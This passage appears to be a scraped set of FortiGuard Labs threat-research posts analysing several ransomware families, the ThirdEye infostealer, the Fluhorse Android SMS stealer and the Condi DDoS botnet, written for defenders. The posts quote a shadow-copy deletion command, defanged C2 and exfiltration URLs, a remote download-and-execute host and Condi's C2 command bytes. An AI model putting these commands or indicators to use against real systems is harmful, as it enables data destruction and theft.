ransomware over several years. Because of this, this section only contains up to 10 samples from each LockBit generation.

place for the vulnerabilities reportedly exploited by LockBit ransomware threat actors: Note: For more information on CVE-2018-13379, see the blog “Prioritizing Patching is Essential for Network Integrity.” Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is generally delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations also need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Organizations are encouraged to implement cloud-based security solutions, such asSASE, to protect off-network devices, advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack, andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context. These solutions are proven to minimize risk and reduce the impact of a successful ransomware attack. By operating these solutions as part of the industry's only fully integratedSecurity Fabric, organizations can also take advantage of native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings that can be deployed independently or as part of the Fortinet Security Fabric. These services are powered by advanced AI-enabled technologies and our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aU.S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3).

    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-rancoz",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers the Rancoz ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High It's only been a few months since the Rancoz ransomware first came to the public's attention. However, it's important to raise awareness of this ransomware variant, as the most recent victim on their data leak site on TOR dates back just a few weeks to mid-June. The first recorded Rancoz victim, according to their TOR site, occurred in November of 2022. The Rancoz modus operandi is similar to other groups, which is to encrypt files on compromised machines, steal information, and extort money from victims. Information on the infection vector used by the Rancoz ransomware threat actor is not currently available. However, it is not likely to differ significantly from other ransomware groups. At the time of this research, there is no indication that Rancoz is widespread. Once executed, Rancoz ransomware enumerates all local drives and encrypts files unless the attackers specify otherwise. It adds a “.rec_rans” extension to the files it encrypts and leaves a ransom note labeled “HOW_TO_RECOVERY_FILES.txt” [sic]. Furthermore, the ransomware deletes shadow copies by running the command “/c vssadmin.exe Delete Shadows /All /Quiet”, which makes file recovery difficult. It then deletes the registry “HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\\” while resetting the registry “HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\\”. Removal of those registry keys may prevent victims from being able to connect to remote servers for file recovery. The ransom note contains the URL of the Rancoz data leak site and the attacker’s contact email address. The ransomware also replaces the desktop wallpaper, prompting victims to read the ransom note. At the time of our investigation, the Rancoz ransomware group had three victims in different industries listed on their date leak site. Two victims are in the U.S., and the other is in Canada. As seen in the below screenshot, the threat actor stole a significant amount of information and exposed that data to the public. Note that some ransomware groups remove company listings from data leak sites after the ransom is paid. Therefore, it is possible that there may be additional victims of the Rancoz ransomware. While submission locations are not a strong indicator of infection, the Rancoz ransomware samples have been submitted to a public file scanning service from the United States, India, France, and Lithuania. What's more interesting is that these submissions were made from early May to late June, which may indicate that the threat actor is still distributing the same Rancoz ransomware sample. Based on the Rancoz samples, FortiGuard Labs has determined that the Buddy ransomware (SHA2: d5e632836622d52c91e4ef059e9124184fceaf85783278880797f788ce141588) may be related to the same attacker or malware developer. Both samples were compiled on the same date and time, “2023-02-19 09:01:20 UTC”. And while this ransomware variant adds a different file extension, \".buddyransome\", to the files it encrypts, it drops a ransom note with the same name (and grammatical error) as the Rancoz ransomware. d5e632836622d52c91e4ef059e9124184fceaf85783278880797f788ce141588 also replaces the desktop wallpaper, like the Rancoz ransomware. And while the contents are different, the opening sentence is the same. We also located another ransomware sample (SHA2: da0332ace0a9ccdc43de66556adb98947e64ebdf8b3289e2291016215d8c5b4c) that may be related to the same attacker. The ransomware dropped by this sample is very similar to that of Rancoz. One significant difference is that the Rancoz ransom note links to a TOR site while the other does not. They also use different contact email addresses. However, the notes are very similar, and it also replaces the desktop wallpaper like Ramcoz and Buddy ransomware. These similarities aren't too surprising. Many ransomware variants are built on top of existing ransomware code. Recent reports indicate several custom variants based on Vice Society ransomware have also been discovered in the field. This trend, combined with common compilation dates and other similarities, supports our theory that the same developer likely created Rancoz and the other ransomware variants covered in this blog. Fortinet customers are already protected from this malware variant through AntiVirus, and FortiEDR services, as follows: FortiGuard Labs detects known Rancoz ransomware variants with the following AV signatures: The other ransomware covered in this blog are also detected as W64/Generik.BPRI!tr.ransom. The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected.

As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aU.S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises).

    "content": "FortiGuard Labs Threat Research Affected platforms:WindowsImpacted parties:Windows UsersImpact:The information collected can be used for future attacksSeverity level:Medium FortiGuard Labs recently came across files that look suspicious, even during a cursory review. Our subsequent investigation confirmed that the files are malicious and revealed there is more to them than meets the eye: they are a previously unseen infostealer we have named “ThirdEye”. While this malware is not considered sophisticated, it’s designed to steal various information from compromised machines that can be used as stepping-stones for future attacks. This blog post analyzes the behavior and evolution of this new infostealer. Our investigation began when we spotted an archive file with a file name in Russian, “Табель учета рабочего времени.zip” (“time sheet” in English). This zip file contains two files our experience immediately identified as up to no good. Both files have a .exe extension preceded by another document-related extension (double extension). And one of the files is “CMK Правила оформления больничных листов.pdf.exe” (“QMS Rules for issuing sick leave” in English, which is an executable instead of a document, as the title suggests). The file has a SHA2 hash value of f6e6d44137cb5fcee20bcde0a162768dadbb84a09cc680732d9e23ccd2e79494. The ThirdEye infostealer has relatively simple functionality. It harvests various system information from compromised machines, such as BIOS and hardware data. It also enumerates files and folders, running processes, and network information. Once the malware is executed, it gathers all this data and sends it to its command-and-control (C2) server hosted at (hxxp://shlalala[.]ru/general/ch3ckState). And unlike most other malware, it does nothing else. One interesting string unique to the ThirdEye infostealer family (from which we derived its name) is \"3rd_eye\", which it decrypts and uses with another hash value to identify itself to the C2. The second item in the archive is “Табель учета рабочего времени.xls.exe”, which shares the same file name with the parent file. This file is a ThirdEye infostealer variant designed to perform the same activities as f6e6d44137cb5fcee20bcde0a162768dadbb84a09cc680732d9e23ccd2e79494. Based on the traits we saw in those ThirdEye infostealer samples, we managed to trace the very first sample to 610aff11acce8398f2b35e3742cb46c6a168a781c23a816de2aca471492161b2, which was first submitted to a public file scanning service on April 4th, 2023. Our analysis of that oldest sample uncovered that it did not harvest as much information as recent samples. The earliest sample we found has a compilation timestamp of Mon Apr 03 12:36:37 2023 GMT and collects the following data: It calculates a “client_hash”, which is used as an identifier. During exfiltration, the collected data is sent to the C2 server with a custom web request header: Cookie: 3rd_eye=[client_hash value] This variant uses hxxp://glovatickets[.]ru/ch3ckState as a C2 server. No significant changes were made to the malware family until a few weeks later. A variant (SHA256: A9D98B15C94BB310CDB61440FA2B11D0C7B4AA113702035156CE23F6B6C5EECF) with a compile timestamp of Wed Apr 26 09:56:55 2023 GMT collected additional data, such as: However, this version would crash in certain virtual machines due to missing hardware information. An updated variant was released one day later (SHA256: C36C4A09BCCDEDA263A33BC87A166DFBAD78C86B0F953FCD57E8CA42752AF2FC). The only change here was the use of a PDF icon. Prior to this, none of the samples we found used a custom/fake icon. “hxxp://ohmycars[.]ru/general/ch3ckState” was used as the C2 by this variant. The following week brought even more changes. This next variant (SHA256: 847CBE9457B001FAF3C09FDE89EF95F9CA9E1F79C29091C4B5B08C5F5FE48337) gathered much more data: While another variant (5D211C47612B98426DD3C8EAC092AC5CE0527BDA09AFA34B9D0F628109E0C796), compiled on Thu May 25 11:02:54 2023 GMT, gathered the same type of data, the main difference was with encoding. Instead of plaintext, the data it collected was encoded in hex. Over the past couple of months, we also spotted some variants that used internal IP addresses 10[.]10[.]30[.]36 in SHA256: 2008BDD98D3DCB6633357B8D641C97812DF916300222FC815066978090FA078F and 192[.]168[.]21[.]182 in SHA256: 847CBE9457B001FAF3C09FDE89EF95F9CA9E1F79C29091C4B5B08C5F5FE48337) instead of an actual C2 server. This was perhaps due to testing new features and/or checking for AV detections. Although there is no concrete evidence that ThirdEye infostealer was used in attacks, the malware is designed to collect information from compromised machines that is valuable for understanding and narrowing down potential targets. We believe this infostealer was designed for that purpose, and ThirdEye victims may be the subjects of future cyberattacks. Since most ThirdEye variants were submitted to a public scanning service from Russia, and the latest variant has a file name in Russian, the attacker may be looking to deploy malware to Russian-speaking organizations. While ThirdEye is not yet considered sophisticated, our investigation found the attacker has put effort into improving the infostealer, such as recent samples collecting more system information compared to older variants. We expect that effort to continue.

    "title": "Ransomware Roundup - Black Basta",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-black-basta",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers the Black Basta ransomware. Affected platforms:Microsoft Windows, VMWare ESXi serversImpacted parties:Microsoft Windows and ESXi UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High Over the past few months, Black Basta ransomware has made headlines for allegedly compromising high-profile European and North American organizations across a variety of industries, such as outsourcing, technology, and manufacturing. The history of Black Basta ransomware dates back to at least April 2022, with a professional organizations company in the United States being one of its first victims. Since then, Black Basta has slowly expanded their operations, with the group allegedly compromising and stealing data from a US government contractor and a US aerospace and defense company in late 2022. This ransomware is considered a successor to the now-defunct Conti ransomware because some former Conti members are believed to be in the Black Basta group. Some also believe there is a potential connection between Black Basta and the Fin7 threat actor due to the groups' similar Tactics, Techniques, and Procedures (TTPs). Black Basta operates a Ransomware-as-a-Service (RaaS) model, in which the developers offer a service such as ransomware, an infrastructure for payment processing and ransom negotiation, and technical support to its affiliates. Once an affiliate gets a victim to pay a ransom, the Black Basta operator receives a portion. Affiliates are responsible for selecting their targets, moving laterally across a victims’ network (often by using tools supplied by ransomware operators, leveraging dual-use tools, and employing living-off-the-land tactics), stealing data, and deploying the ransomware. Tools reportedly used by Black Basta threat affiliates include PsExec, Windows Management Instrumentation (WMI), PowerShell, Netcat, BITSAdmin, BCDEdit, SystemBC, Mimikatz, ColbaltStrike, Brute Ratel C4, remote access tools, and RClone. Before deploying the ransomware to compromised networks, Black Basta attackers install and configure the open-source file-transfer utility “RClone” to steal the data that they collected. The stolen data is then used for their double-extortion scheme, where the files are leaked to the public if a victim fails to meet the ransom demands. The Black Basta ransomware was initially only supported on Windows platforms. However, the Black Basta developer released a new variant targeting ESXi systems in 2022. The group also updated and released Black Basta ransomware 2.0, which reportedly incorporates a new encryption algorithm. Note that FortiGuard Labs previously released a Threat Signal for Black Basta ransomware on May 2nd, 2022: Black Basta has been seen to use techniques from spearphishing to purchasing access through Initial Access Brokers (IABs) to gain initial access. Access has also been obtained using malware from other groups, such as QakBot (QBot). The exploitation of the PrintNightmare (CVE-2021-34527) and Follina (CVE-2022-30190) vulnerabilities have also been reported. More details on CVE-2021-34527 and CVE-2022-30190 are available as Outbreak Alerts previously released by FortiGuard Labs: FortiGuard Labs is aware that the ransomware component of Black Basta has been compiled as a Windows executable, more recently as a Windows DLL, and additionally as a Linux executable The functionality between the two versions is identical, as is the final step in the attack chain. Black Basta has been observed using the XChaCha20 stream cipher  (https://en.wikipedia.org/wiki/ChaCha20-Poly1305) to encrypt its files. This is built into the software using the Crypto++ C++ library (https://www.cryptopp.com/). Files are encrypted quickly using multi-threading, with the file extension for encrypted files being unique for each ransomware build. The ransom note is assembled and dropped into each directory that includes files that have been encrypted. Note in Figure 6 that the Login ID (the ID used by the threat actor to identify the victim when they make contact) is hardcoded into the ransomware, which suggests some customization for a particular victim. The ransom note labeled “Instructions_read_me.txt” is automatically opened in Notepad so the victim can easily see it. The note demands that the victim use Tor to contact the ransomware gang = at a specified “.onion” site. Instructions for downloading and installing the Tor browser are provided. It also suggests that the victim not contact a recovery company or outside ransom negotiators. Black Basta has also developed a Linux executable primarily designed to target VMWare ESXi deployments rather than more general individual Linux systems. This can be easily shown by running the ransomware on a non-ESXi deployment. When executed, the malware will be unable to locate the “/vmfs/volumes/” directory and be unable to run. This directory (VMFS is the “Virtual Machine File System,” and “volumes” is where VM disk images reside, which would be the main target of the ransomware). If that folder is then put in place, it will execute (although nothing will occur on a non-ESXi host). The Linux version of Black Basta has several command line flags that suggest it is designed to be executed by an individual who has remote access to a victim ESXi server. Again, executing in a non-ESXi environment fails. However, it allows for the tracing of the event in assembly. The “-killesxi” command triggers a fairly involved Bash sequence, as shown in Figure 12 below. As ESXi installations are the primary focus of the Black Basta Linux variant, it is only interested in four related file types for encryption: “.vmsd”, “.vmx”, “vmxf”, and “vmdk”. As with the Windows version, the Linux version of Black Basta hardcodes the file extension for encrypted files into the code for deployment, and it changes from file to file. Whether using the “-forcepath” command line flag to encrypt a single, non-standard directory with files of interest or the default location of “/vmfs/volumes/”, this version will encrypt files as efficiently as the Windows version. The ransom note for the Linux version of Black Basta is identical to the Windows version. Again, the victim must contact the gang at a specified “.onion” site. As the ransom notes above show, the Black Basta threat actors want their victims to contact them at a specific Tor address. Once there, the site requires the visitor to enter their “Login ID” from the ransom note to identify the organization they’re from, along with the completion of a captcha to prevent automated connections. In addition to the communication site, Black Basta operates a “name and shame” Tor site titled “Basta News”. This site provides the group’s “proof” that it has compromised a given organization, publication status, and visitor count. During our investigation, Black Basta’s data leak site listed more than 200 victims in North America and Europe. More than 60% of the alleged victims are U.S. organizations. Distant second place belongs to Germany at 15%, followed by Canada at close to 6%. We divided the victim list into four groups: older victims to newer victims. While the oldest victim group spreads across 12 countries, the second and third group victims include only eight countries. The latest victim group has only six countries (U.S., Germany, Canada, Italy, UK, Slovenia), which may indicate that Black Basta affiliates have narrowed the target list. As for its targeted industries, more than 25% of the victims listed on the leak site are in manufacturing, construction, service, and retail. However, 50% of the victims are in those four industries. Other affected sectors include legal, warehouse, finance, and IT. Based on what’s in the data leak site, over 80% of the victims suffered from some or all of their stolen data being leaked to the public.

the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aU.S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises).

    "title": "Fortinet Reverses Flutter-based Android Malware “Fluhorse”",
    "link": "https://www.fortinet.com/blog/threat-research/fortinet-reverses-flutter-based-android-malware-fluhorse",
    "content": "FortiGuard Labs Threat Research Android/Fluhorseis a recently discovered malware family that emerged in May 2023. What sets this malware apart is its utilization of Flutter, an open-source SDK (software development kit) renowned among developers for its ability to build applications compatible with Android, iOS, Linux, and Windows platforms using a single codebase. While previous instances of threat actors using Flutter for malware exist, such asMoneyMonger, they actually used Flutter for its cross-platform UI elements without carrying the actual malicious payload. So, despite Flutter application reversing being notoriously difficult, MoneyMonger can actually be quite easily reversed with the usual Android reversing techniques. The Android/Fluhorse family represents a significant shift asit incorporates the malicious components directly within the Flutter code. This blog post covers insights on two notable aspects: 1.        The Fluhorse campaign of May had basic obfuscation and no packing.In June, however, the sample we analyzed was packed. This is evidence that malware authors are moving to the next step of maturity. 2.Reverse engineering technique. Reversing Flutter applications is widely considered a challenging endeavor. Many researchers treat it as a black box, only analyzing those components that can be observed from the outside.Some employ dynamic instrumentation tools, like re-Flutter and re-flutter-demo, which come with their own complexities and risks associated with running malware in controlled environments. But for our analysis, we successfully managed tofully reverse-engineer the Fluhorse malware in a static manner, without the need for dynamic execution. Note that Fortinet customers are fully protectedagainst this family of malware. These samples are detected as Android/Fluhorse.A!tr.spy or Android/Packed.57103!tr, and all related URLs mentioned in this blog are detected and blocked. The malware we analyzed posed as a legitimate app for anelectronic toll systemused in Southern Asia. It lures the victim into entering his/her credentials, steals them, and also steals 2FA (two-factor authentication) codes by listening to incoming SMS and forwarding them to a website controlled by the attackers. Victims typicallyinstall the malware via e-mail phishing campaigns, with previous  research claiming that Fluhorse has been downloaded over 100,000 times. The current version we analyzed (SHA256: 2c05efa757744cb01346fe6b39e9ef8ea2582d27481a441eb885c5c4dcd2b65b) was first seen on June 11, 2023. It is distributed from the malicious URL hxxps://fasd1[.]oss-ap-southeast-1.aliyuncs.com/ETC.apk. FortiGuard’s telemetry shows it has been being accessed from Asia since June 12. The sample is packed, concealing the encrypted payload within the wrapping application’s Dalvik executable, classes.dex. The packer adds a 4-byte integer at the end of the DEX that includes (1) the size of the encrypted payload and, just before that, (2) the encrypted payload. Decryption is performed at the native level(to harden reverse engineering) using OpenSSL’s EVP cryptographic API. The encryption algorithm is AES-128-CBC, and its implementation uses the same hard-coded string for the key and initialization vector (IV). From a cryptographic point of view, this is a bad idea as the IV is not meant to be confidential. The decrypted payload is a ZIP file that contains another DEX. The payload is then installed (the packer’s implementation includes Android sources for MultiDex support). The “main” of the malware is found in the payload (com.dsfdgfd.sdfsdf.MainActivity). It simply loads the Flutter application, as in the unpacked version of May 2023. Our in-depth static analysis of libapp.so revealed everything we needed to know, including the supposed directory structure of the malicious source code. The malicious Dart package is namedsms_fluterand has the following files: The malware uses the DartTelephonypackage. This package is non-malicious and its code is open-source anddocumented. In particular, the package offers the possibility oflistening to incoming SMS in the background. The malware author closely followed the documentation and created the following code (code is my manual re-construction from assembly). onBackgroundMessage(SmsMessage message) async {// malicious tasks}void main() {runApp(MyApp());} The corresponding assembly lines are shown below. For the reverse engineer, finding the address of a given Dart function is difficult. Several researchers usereFlutter, orsimilar techniqueswhere the application is instrumented and then run, causing each address to be dumped. Unfortunately, for malware analysts, this technique has two major drawbacks besides its complex setup: first, you only get the addresses of the functions you visit. Second,you instrument and run a malware, which should be avoided. To obtain the addresses I was looking for, I usedJEB, a reverse-engineering tool that offers some limited (but at least existing) support for Flutter. In particular, it finds the addresses of each referenced method and is usually able to correctly map the name in the assembly code. When it fails (more frequently on ARM32 and ARM64), I fall back to reversing the x86_64 library. Fortunately, the x86_64 version was provided in this Fluhorse sample, probably by error, because the rest of the implementation (for example, the packing) is not implemented for x86_64. If that doesn’t work, then I manually get the address from JEB’s code information and re-base it with the relocation base for zero-based objects. We can see below that the malware listens to incoming SMS. First, it registers for change notifications on SMS and then callslistenIncomingSmsin theTelephonypackage. The malware then posts the incoming SMS message to a remote website in an asynchronous task. Reverse engineering the code reveals several specificities to Dart assembly. In Dart, all constants, literals, etc, are stored in an Object Pool, which is like an index table. Later, all access to strings is done indirectly: the code asks for access to a given index. Dart assembly dedicates a custom registerR15for x86_64 to access the Object Pool. The illustrated example above accesses R15+8FB7, which corresponds to index 0x8FB7 // 8 =4598.JEB shows the Object Pool indexesfor us and lets us map the assembly line by fetching the domain name string. The SMS body is inserted in the URL as argument “c4” (e.g., hxxp://pmm122[.]com/addcontent?c4=hello). Theincoming phone number is not providedbecause the Telephony package does not provide this feature. In thefollowing code of the (non-malicious) Telephony package, see that only the SMS body is retrieved and provided to the callback. try {await handlerFunction(SmsMessage.fromMap(call.arguments['message'], INCOMING_SMS_COLUMNS));} catch (e) { Later, Fluhorse’s code performs the HTTP POST of the SMS message and reads the response. This is handled byDart’s standard HTTP package. Reversing Flutter applications statically is a breakthrough for anti-virus researchers, as, unfortunately, more malicious Flutter apps are expected to be released in the future. Building expertise in dealing with these samples and improving tools is necessary. This blog post provides results for Android/Fluhorse. More detailed explanations have been submitted to conferences in Q4 2023, where I hope to be selected to explain this live. ;) Stay tuned!

    "title": "Condi DDoS Botnet Spreads via TP-Link's CVE-2023-1389",
    "link": "https://www.fortinet.com/blog/threat-research/condi-ddos-botnet-spreads-via-tp-links-cve-2023-1389",
    "content": "FortiGuard Labs Threat Research Affected platforms:LinuxImpacted parties:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity level:Critical FortiGuard Labs encountered recent samples of aDDoS-as-a-service botnet calling itself Condi. It attempted to spread by exploiting TP-Link Archer AX21 (AX1800) routers vulnerable toCVE-2023-1389, which was disclosed in mid-March of this year. We have additionally observed an increasing number of Condi samples collected from our monitoring systems since the end of May 2023, indicating an active attempt to expand the botnet. This blog details the capabilities of this botnet. While pivoting from the Command and Control (C2) domain cdn2[.]duc3k[.]com in one of the malware samples, FortiGuard Labs researchers found a sibling domain admin[.]duc3k[.]com that previously displayed the message \"contact @zxcr9999 telegram”. A quick search revealed a Telegram channel, Condi Network, advertising a Condi botnet with capabilities matching those observed in our sample (Figure 1). The Telegram channel was started in May 2022, and the threat actor has been monetizing its botnet by providing DDoS-as-a-service and selling the malware source code (Figure 2). We provide a technical analysis of the ARM malware sample509f5bb6bcc0f2da762847364f7c433d1179fb2b2f4828eefb30828c485a3084in the following sections: This malware employs several techniques to keep itself running in an infected system. At the same time, it also prevents infections from other botnets by attempting to terminate their processes. Typical to Mirai-based botnets, this malware cannot survive a system reboot. Because of this, it deletes the following binaries used to shut down or reboot the system. It also reads the /proc/<PID>/status for each running process and compares the Name field to the following strings to kill any processes with matching names: We assess that the developer intended to kill off older versions of Condi currently running on an infected device together with selected system processes. However, the implementation is flawed as the Name field only contains the executable names of processes and not their full paths. Additionally, it kills any processes with binary filenames containing the following extensions commonly used by other botnets: It also generates a random string of at least ten characters from the custom alphanumeric character set \"lvrvup9w0zwi6nuqf0kilumln8ox5vgv@\" and attempts to kill any process with this string in its command line, however it is near certain this process will not exist. Which process the malware developer intended to terminate with this code is unclear. Finally, it generates two numbers (one between 12 and 32, the other between 12 and 20) and kills any processes with a command line length matching either number. Killing off random processes based on their command line length is likely to wreak havoc and prevent the infected device from functioning correctly if the malware happens to terminate system processes. Unlike most DDoS botnets, this sample does not propagate by trying different credentials. Instead, it embeds a simple scanner modified from Mirai’s original Telnet scanner to scan for any public IPs with open ports 80 or 8080 (commonly used for HTTP servers) and then sends a hardcoded exploitation request (Figure 3) to download and execute a remote shell script at hxxp://cdn2[.]duc3k[.]com/t, which will infect the device with Condi if it is a vulnerable TP-Link Archer AX21 device. The remote shell script is typical of Mirai-based loaders that try to download and execute binaries of each architecture in turn (Figure 4). The first command-line argument provided to the malware binary, ”0days”, in this case, is referred to as “id” (“source” in the original Mirai code), which DDoS botnet operators commonly use to identify the method used to replicate the malware. While the sample we analyzed only contained the scanner for CVE-2023-1389, other Condi botnet samples were also seen exploiting other vulnerabilities to propagate. The publicly available source code for older versions also includes scanners for known vulnerabilities exploited by other Mirai variants. We also observed shell scripts hosted on the same IP with different sources in the execution commands. Figure 5 shows a script with an “adb” source, which refers to Android Debug Bridge (ADB). We found source code for an older version of Condi that scans for devices withan open Android Debug Bridge port(TCP/5555), so it is possible that the botnet is currently being propagated via this means. The binary protocol used by Condi to communicate with the C2 server is a modified version of that initially implemented in Mirai. The initial registration packet sent by the bot to the C2 contains the bytes\\x33\\x66\\x99, commonly associated with Moobot, another Mirai variant. These bytes are followed by a one-byte length of the “id”. In the case of Condi, \"id” defaults to “c” if none was specified, or in our case, of an infection via CVE-2023-1389, “0days”. This signals the C2 server that the malware is ready to receive commands. The first three bytes of the C2 response indicate the command for the Condi bot: 1.\\x99\\x66\\x33: Likely to check if the malware is still active, in which case the malware sends a packet to C2 with \\x66\\x99\\x66\\x04 followed by “ping” 2.\\x99\\x66\\x66: Terminate the bot 3.\\x33\\x66\\x66: Start the webserver for serving malware binaries 4.\\x33\\x66\\x33: Update binaries served by the webserver 5.\\x33\\x66\\x99: Send the webserver port. Malware responds with \\x66\\x99\\x66 followed by a length of the next string and “CondiiNeett webserv:<PORT>\" 6.\\x66\\x66\\x99: Sets an unusedlockdownflag, which might indicate a feature in development. Once it receives the\\x33\\x66\\x66command used to start the webserver, this malware downloads bot binaries from a hardcoded IP and port. After that, it starts a basic HTTP server on a random port number above 1024 to host these binaries. GET, POST, and HEAD requests to this server for the/arm,/arm7,/mips,/mipsel,/x86_64,/sh4,/ppc, and/m68kURLs will serve these binaries if they were downloaded previously. This HTTP server masquerades as a legitimate Apache HTTP server by responding with the “Server: Apache” header when any URLs are requested. From then on, the threat actor can issue the\\x33\\x66\\x33command to download the latest binaries from the same hardcoded IP and port so that the webserver serves the most updated version of the malware. If the first byte of the C2 response is not\\x33,\\x66, or\\x99, the bot parses it as an attack command in the same way as Mirai. Below is this sample's list of attack functions and a description of the implemented attack method. As the attack methods are consistent with the descriptions in the Telegram advertisement (Figure 1), this particular sample was likely built by the bot developer or someone with access to the malware source code. This sample did not contain any HTTP attack methods observed in older Condi versions. Malware campaigns, especially botnets, are always looking for ways to expand. Exploiting recently discovered (or published) vulnerabilities has always been one of their favored methods, as we highlighted above for the Condi botnet. Thus, it is strongly recommended to always apply the latest security patches and updates as soon as possible. As always, FortiGuard Labs will continue to monitor these campaigns.

    "content": "FortiGuard Labs Threat Research FortiGuard Labs came across two new ransomware variants, “Big Head” and another likely used by the same attacker, targeting consumers to extort money. On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers the Big Head ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High FortiGuard Labs recently came across a new ransomware variant called Big Head, which came out in May 2023. Although there are at least three variants of Big Head ransomware, all are designed to encrypt files on victims’ machines to extort money, like other ransomware variants. One Big Head ransomware variant displays a fake Windows Update, potentially indicating that the ransomware was also distributed as a fake Windows Update. One of the variants has a Microsoft Word icon and was likely distributed as counterfeit software. At the time of this research, there is no indication that Big Head is widespread. FortiGuard Labs is aware of at least two variants of Big Head ransomware, which we have named variants A and B. Variant A Once Big Head ransomware variant A is executed, it displays a fake Windows Update screen to trick users into believing that legitimate actions are occurring behind the scenes. The fake Windows Update lasts about 30 seconds and automatically closes. By the time the phony update is done, the ransomware has already encrypted files on compromised machines with file names randomly altered. The ransomware then opens a ransom note labeled “README_[random seven digits number] that demands victims contact the attacker via email or telegram for file decryption and data leak. Big Head ransomware variant A has also been seen to leave a slightly different version of the ransom note, including the attacker’s Bitcoin address for “immediate ransom payment.” Variant B While the Big Head ransomware variant B did not encrypt any files in our test environment, it is designed to encrypt files on compromised machines. Our analysis found that variant B uses a PowerShell file named “cry.ps1” for file encryption. The variant B does not drop cry.ps1 in some cases, and file encryption does not occur. However, it does not stop variant B from replacing the Desktop wallpaper with its own containing ransom note. Like variant A, the ransom note requests that victims contact the attacker using the same email address or telegram channel. The difference is that a  ransom fee of one Bitcoin is included in the variant B ransom note. The relatively low ransom fee indicates that Big Head ransomware is used to target consumers rather than enterprises. Variant B separately drops a ransom note labeled 